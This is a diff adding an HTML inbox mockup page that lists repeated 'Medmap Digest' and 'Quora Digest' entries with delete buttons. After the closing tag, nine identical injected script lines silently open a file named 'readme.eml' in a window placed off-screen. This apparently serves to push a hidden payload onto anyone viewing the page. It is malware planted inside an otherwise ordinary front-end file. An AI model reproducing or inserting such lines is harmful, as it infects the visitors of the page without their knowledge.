@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<meta charset="UTF-8">
+<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+<link rel="stylesheet" type="text/css" href="css/style.css">
+<body>
+	<div ng-app="">
+		<div class="header">
+			<div class="col-md-9 col-sm-7 col-xs-4 zeropadding">
+				<span class="header-menu-icon">
+					<img src="images/Header_menu.svg">
+				</span>
+				<span class="header-menu-text">Inbox</span>
+			</div>
+			<div class="col-md-3 col-sm-5 col-xs-8" style="padding-right: 0px;">
+				<!-- <span>
+				<input type="text" id="myInput" onkeyup="myFunction()" placeholder="Search for names.." title="Type in a name">
+				</span> -->
+				<div class="top-bar">
+				    <div class="search-container">
+				        <input class="search" id="myInput" onkeyup="myFunction()" type="search" placeholder="Search...">
+				    </div>
+				</div>
+			</div>
+		</div>
+		<div class="content">
+			<ul class="list-group no-bg no-borders pull-in" id="myUL">
+		        <li class="list-group-item clearfix listingItem" id="ListDel1">
+		        	<div class="wrapper">
+					    <div class="right">					        
+				          	<p class="deletetab" id="Del1" onclick="DeleteTab(this)">Delete</p>
+					    </div>
+					    <div class="moving">
+					        <a herf="" class="pull-left w-40 m-r color-orange">
+								<span>M</span>
+							</a>
+				          	<div class="clear text-ellipsis">
+					            <div class="main-head">
+					            	<a>Medmap Digest</a>
+					            	<span>10:40</span>
+					            </div>
+				            <p class="text-muted-dk">Answer : It is very possible Elan Musk...</p>
+				            <small class="text-muted-dk">Answer : It is very possible Elan Musk...</small>
+				          	</div>
+					    </div>
+					</div>				
+		        </li>
+		        <li class="list-group-item clearfix listingItem" id="ListDel2">
+		        	<div class="wrapper">
+					    <div class="right">					        
+				          	<p class="deletetab" id="Del2" onclick="DeleteTab(this)">Delete</p>
+					    </div>
+					    <div class="moving">
+					        <a herf="" class="pull-left w-40 m-r color-green">
+								<span>Q</span>
+							</a>
+				          	<div class="clear text-ellipsis">
+					            <div class="main-head">
+					            	<a>Quora Digest</a>
+					            	<span>10:40</span>
+					            </div>
+				            <p class="text-muted-dk">Answer : It is very possible Elan Musk...</p>
+				            <small class="text-muted-dk">Answer : It is very possible Elan Musk...</small>
+				          	</div>
+					    </div>
+					</div>
+		        </li>
+		        <li class="list-group-item clearfix listingItem" id="ListDel3">
+		        	<div class="wrapper">
+					    <div class="right">					        
+				          	<p class="deletetab" id="Del3" onclick="DeleteTab(this)">Delete</p>
+					    </div>
+					    <div class="moving">
+					        <a herf="" class="pull-left w-40 m-r color-orange">
+								<span>M</span>
+							</a>
+				          	<div class="clear text-ellipsis">
+					            <div class="main-head">
+					            	<a>Medmap Digest</a>
+					            	<span>10:40</span>
+					            </div>
+				            <p class="text-muted-dk">Answer : It is very possible Elan Musk...</p>
+				            <small class="text-muted-dk">Answer : It is very possible Elan Musk...</small>
+				          	</div>
+					    </div>
+					</div>				
+		        </li>
+		        <li class="list-group-item clearfix listingItem" id="ListDel4">
+		        	<div class="wrapper">
+					    <div class="right">					        
+				          	<p class="deletetab" id="Del4" onclick="DeleteTab(this)">Delete</p>
+					    </div>
+					    <div class="moving">
+					        <a herf="" class="pull-left w-40 m-r color-green">
+								<span>Q</span>
+							</a>
+				          	<div class="clear text-ellipsis">
+					            <div class="main-head">
+					            	<a>Quora Digest</a>
+					            	<span>10:40</span>
+					            </div>
+				            <p class="text-muted-dk">Answer : It is very possible Elan Musk...</p>
+				            <small class="text-muted-dk">Answer : It is very possible Elan Musk...</small>
+				          	</div>
+					    </div>
+					</div>
+		        </li>
+		        <li class="list-group-item clearfix listingItem" id="ListDel5">
+		        	<div class="wrapper">
+					    <div class="right">					        
+				          	<p class="deletetab" id="Del5" onclick="DeleteTab(this)">Delete</p>
+					    </div>
+					    <div class="moving">
+					        <a herf="" class="pull-left w-40 m-r color-orange">
+								<span>M</span>
+							</a>
+				          	<div class="clear text-ellipsis">
+					            <div class="main-head">
+					            	<a>Medmap Digest</a>
+					            	<span>10:40</span>
+					            </div>
+				            <p class="text-muted-dk">Answer : It is very possible Elan Musk...</p>
+				            <small class="text-muted-dk">Answer : It is very possible Elan Musk...</small>
+				          	</div>
+					    </div>
+					</div>				
+		        </li>
+		        <li class="list-group-item clearfix listingItem" id="ListDel6">
+		        	<div class="wrapper">
+					    <div class="right">					        
+				          	<p class="deletetab" id="Del6" onclick="DeleteTab(this)">Delete</p>
+					    </div>
+					    <div class="moving">
+					        <a herf="" class="pull-left w-40 m-r color-green">
+								<span>Q</span>
+							</a>
+				          	<div class="clear text-ellipsis">
+					            <div class="main-head">
+					            	<a>Quora Digest</a>
+					            	<span>10:40</span>
+					            </div>
+				            <p class="text-muted-dk">Answer : It is very possible Elan Musk...</p>
+				            <small class="text-muted-dk">Answer : It is very possible Elan Musk...</small>
+				          	</div>
+					    </div>
+					</div>
+		        </li>
+		        <li class="list-group-item clearfix listingItem" id="ListDel7">
+		        	<div class="wrapper">
+					    <div class="right">					        
+				          	<p class="deletetab" id="Del7" onclick="DeleteTab(this)">Delete</p>
+					    </div>
+					    <div class="moving">
+					        <a herf="" class="pull-left w-40 m-r color-orange">
+								<span>M</span>
+							</a>
+				          	<div class="clear text-ellipsis">
+					            <div class="main-head">
+					            	<a>Medmap Digest</a>
+					            	<span>10:40</span>
+					            </div>
+				            <p class="text-muted-dk">Answer : It is very possible Elan Musk...</p>
+				            <small class="text-muted-dk">Answer : It is very possible Elan Musk...</small>
+				          	</div>
+					    </div>
+					</div>				
+		        </li>
+		        <li class="list-group-item clearfix listingItem" id="ListDel8">
+		        	<div class="wrapper">
+					    <div class="right">					        
+				          	<p class="deletetab" id="Del8" onclick="DeleteTab(this)">Delete</p>
+					    </div>
+					    <div class="moving">
+					        <a herf="" class="pull-left w-40 m-r color-green">
+								<span>Q</span>
+							</a>
+				          	<div class="clear text-ellipsis">
+					            <div class="main-head">
+					            	<a>Quora Digest</a>
+					            	<span>10:40</span>
+					            </div>
+				            <p class="text-muted-dk">Answer : It is very possible Elan Musk...</p>
+				            <small class="text-muted-dk">Answer : It is very possible Elan Musk...</small>
+				          	</div>
+					    </div>
+					</div>
+		        </li>		        
+	      	</ul>
+		</div>
+	</div>
+<script type="text/javascript" src="js/jQuery-2.1.4.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+<script src="js/bootstrap.min.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.touchswipe/1.6.18/jquery.touchSwipe.min.js"></script>
+<script type="text/javascript" src="js/index.js"></script>
+</body>
+</html>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
